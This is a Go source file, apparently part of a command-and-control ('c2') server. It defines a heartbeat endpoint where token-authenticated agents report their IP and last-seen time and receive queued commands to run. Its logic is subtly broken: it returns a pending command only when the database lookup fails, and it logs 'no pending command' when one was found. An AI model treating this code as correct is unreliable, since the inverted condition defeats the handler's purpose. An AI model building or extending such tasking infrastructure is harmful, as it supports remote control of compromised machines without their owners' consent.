package agent

import (
	"c2/database"
	"c2/utils"
	"encoding/json"
	"net/http"
	"time"
)

// HeartbeatRequest tanpa ID, karena ID diambil dari token
type HeartbeatRequest struct {
	LastSeen  time.Time `json:"last_seen"`
	IPAddress string    `json:"ip_address"`
}

func Heartbeat(w http.ResponseWriter, r *http.Request) {
	// Ambil token dari header Authorization
	tokenString := r.Header.Get("Authorization")
	if tokenString == "" {
		utils.LogError("Missing Authorization header in Heartbeat")
		http.Error(w, "Unauthorized: Missing Authorization header", http.StatusUnauthorized)
		return
	}

	// Verifikasi token dan ambil ID agent
	agentID, err := utils.VerifyToken(tokenString)
	if err != nil {
		utils.LogError("Invalid token in Heartbeat: " + err.Error())
		http.Error(w, "Unauthorized: Invalid token", http.StatusUnauthorized)
		return
	}

	// Decode body
	var req HeartbeatRequest
	err = json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		utils.LogError("Invalid input in Heartbeat: " + err.Error())
		http.Error(w, "Bad Request: Invalid input", http.StatusBadRequest)
		return
	}

	// Validasi apakah agent ada
	db := database.Connect()
	defer db.Close()

	var count int
	err = db.QueryRow("SELECT COUNT(*) FROM agents WHERE id = ?", agentID).Scan(&count)
	if err != nil || count == 0 {
		utils.LogError("Agent not found in database: " + agentID)
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	// Update last_seen dan IP
	_, err = db.Exec(`UPDATE agents SET last_seen = ?, ip = ? WHERE id = ?`,
		req.LastSeen, req.IPAddress, agentID)
	if err != nil {
		utils.LogError("Error updating agent last_seen in Heartbeat: " + err.Error())
		http.Error(w, "Internal Server Error: Unable to update agent", http.StatusInternalServerError)
		return
	}

	// Cek apakah ada command pending
	var cmd database.Command
	row := db.QueryRow(`
		SELECT id, agent_id, command, status, result, created_at, executed_at
		FROM commands
		WHERE agent_id = ? AND status = 'pending'
		ORDER BY created_at ASC
		LIMIT 1
	`, agentID)

	err = row.Scan(
		&cmd.ID,
		&cmd.AgentID,
		&cmd.Command,
		&cmd.Status,
		&cmd.Result,
		&cmd.CreatedAt,
		&cmd.ExecutedAt,
	)

	// Siapkan response
	response := map[string]interface{}{
		"message":   "Heartbeat received successfully",
		"agent_id":  agentID,
		"last_seen": req.LastSeen,
	}

	if err != nil {
		response["pending_command"] = cmd
	} else {
		utils.LogInfo("No pending command for agent: " + agentID)
	}

	utils.LogInfo("Heartbeat received successfully from agent: " + agentID)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(response)
}
